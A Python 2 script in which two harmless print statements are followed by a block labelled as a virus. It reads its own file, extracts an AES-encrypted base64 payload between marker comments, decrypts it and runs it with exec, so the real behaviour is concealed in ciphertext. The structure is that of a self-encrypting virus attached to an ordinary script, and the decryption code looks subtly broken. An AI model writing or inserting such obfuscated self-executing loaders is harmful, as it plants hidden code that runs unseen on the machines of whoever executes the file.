print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"



print "lolol"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   
   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload